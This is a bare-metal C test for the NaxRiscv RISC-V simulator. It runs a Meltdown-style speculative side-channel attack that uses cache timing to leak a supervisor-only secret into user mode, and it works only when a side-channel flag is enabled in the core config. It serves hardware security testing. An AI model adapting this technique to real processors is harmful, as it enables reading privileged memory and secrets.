/*
To work, you need to enable sideChannels = true in the Config.plugins, which will let the data cache write load values to the register file even when mmu checks failed

compile via :
make rv64 ima

Run in sim via :
obj_dir/VNaxRiscv --name play --load-elf ../../../../ext/NaxSoftware/baremetal/side_channel/build/rv64ima/side_channel.elf --start-symbol _start --pass-symbol pass --fail-symbol fail --trace --trace-ref --stats-print-all --trace --trace-ref --spike-debug
*/

#include <type.h>
#include <sim.h>
#include "privilege.h"
#include "utils.h"
#include "mmu.h"
#include "io.h"
#include "side_channel.h"
#include "string.h"

//We need to know the number of way to "invalidate" the data cache, allowing a easy line refill timing mesurement
#define DATA_CACHE_WAYS 4

//Many address are defined here, notice that they are arrange in a way to avoid cache set and mmu set conflicts
#define USER_STACK 0x80010000l
#define SECRET_OFFSET 0x20100
#define SECRET_PHYSICAL (0x80000000 | SECRET_OFFSET)
#define USER_SECRET_SIDE_CHANNEL_ADDRESS  (0xB0400000 | SECRET_OFFSET)
#define SUPERVISOR_SECRET_ADDRESS  (0xB0800000 | SECRET_OFFSET)
#define USER_SECRET_ADDRESS  (0xB0C00000 | SECRET_OFFSET)

#define SECRET "Miaou\n"
#define SECRET_LENGTH 7
volatile char *secret = SECRET;
volatile char decoded[SECRET_LENGTH+1];

#define mmu_tables_0 0x90000000l
#define mmu_tables_1 0x90001000l
#define mmu_tables_2 0x90002000l

void supervisor_main();
void user_test_page_fault();
void user_test_side_channel();
void user_test_side_channel();

void fail();
void assert(int conditione){
  if(!conditione) {
    sim_puts("FAIL\n");
    fail();
  }
}

int main(){
  sim_puts("*** main enter ***\n");
  strcpy((volatile char *)SECRET_PHYSICAL, secret);

  //Map program into user space
  mmu_set_leaf(mmu_tables_1, 1, 0x80000000, 0x80000000, 0xDF);
  mmu_set_leaf(mmu_tables_1, 1, USER_SECRET_SIDE_CHANNEL_ADDRESS, 0x80000000, 0xDF); //Provide user access to the secret via a side channel, to allow loading it in the cache, avoiding cache misses
  mmu_set_leaf(mmu_tables_1, 1, SUPERVISOR_SECRET_ADDRESS, 0x80000000, 0xCF); //Provide supervisor access to the secret
  mmu_set_tree(mmu_tables_0, 2, 0x80000000, mmu_tables_1);

  //Map IO into user space
  mmu_set_leaf(mmu_tables_2, 1, 0x10000000, 0x10000000, 0xDF);
  mmu_set_tree(mmu_tables_0, 2, 0x10000000, mmu_tables_2);

  mmu_enable(mmu_tables_0);

  //Here we ensure that reading SUPERVISOR_SECRET_ADDRESS will page fault in user mode
  machine_to_user((u64)user_test_page_fault, USER_STACK);
  assert(csr_read(mcause) == CAUSE_PAGE_FAULT);

  //Some warmup to load the caches and TLB with the attack code
  sim_puts("*** warmup ***\n");
  machine_to_user((u64)user_test_side_channel, USER_STACK);
  assert(csr_read(mcause) == CAUSE_ECALL);

  //Real attack which should print the secret by accessing SUPERVISOR_SECRET_ADDRESS
  sim_puts("*** attack ***\n");
  machine_to_user((u64)user_test_side_channel, USER_STACK);
  assert(csr_read(mcause) == CAUSE_ECALL);
  assert(strcmp(decoded, secret) == 0);

  sim_puts("*** main exit ***\n");
  return 0;
}


void user_test_page_fault(){
  sim_puts("*** user_test_page_fault ***\n");
  sim_putchar(*((volatile char*)SUPERVISOR_SECRET_ADDRESS));
}

//Used as the line speculatively loaded (timing attack)
volatile char lines_probe[1][64]  __attribute__ ((aligned (4096)));

//Used to flush the data cache sets
volatile char lines_flush[DATA_CACHE_WAYS][64][64]  __attribute__ ((aligned (4096)));

void user_test_side_channel(){
  volatile char* secret_address_reg = (volatile char*)SUPERVISOR_SECRET_ADDRESS;
  sim_puts("*** user_test_side_channel ***\n");

  for(int char_id = 0;char_id < SECRET_LENGTH;char_id++){
    decoded[char_id] = 0;
    for(int bit_id = 0;bit_id < 8;bit_id++){
      //Flush the cache
      for(int i = 0;i < 64;i++){
        for(int w= 0;w < DATA_CACHE_WAYS;w++){
          *((volatile u8*) lines_flush[w][0]);
        }
      }

      //Load secret in L1, necessary as the D$ will not do cache on page fault.
      *((volatile u8*) USER_SECRET_SIDE_CHANNEL_ADDRESS);

      //Train side_channel_attack branch prediction + load hit prediction + fill instruction cache
      REPEAT32(side_channel_attack((u64)lines_flush, bit_id, (u64)lines_flush, 1););

      //Do the speculative cache line load !
      side_channel_attack((u64)secret_address_reg+char_id, bit_id, ((u64)lines_probe), 0);

      //Check which cache line was speculatively loaded
      u64 start_time = read_u32(CLINT_TIME);
      *((volatile u8*) lines_probe);
      u64 delta_time = read_u32(CLINT_TIME) - start_time;
//      sim_puthex(delta_time); sim_putchar('\n');

      //Analyse the timings
      if(delta_time > 0xA) decoded[char_id] |= 1 << bit_id;
    }
    sim_puts("GOT : "); sim_putchar(decoded[char_id]); sim_putchar('\n');
  }

  decoded[SECRET_LENGTH] = 0;
  sim_puts(decoded);
} //M = 0x4d = 0100 1101  => 10110010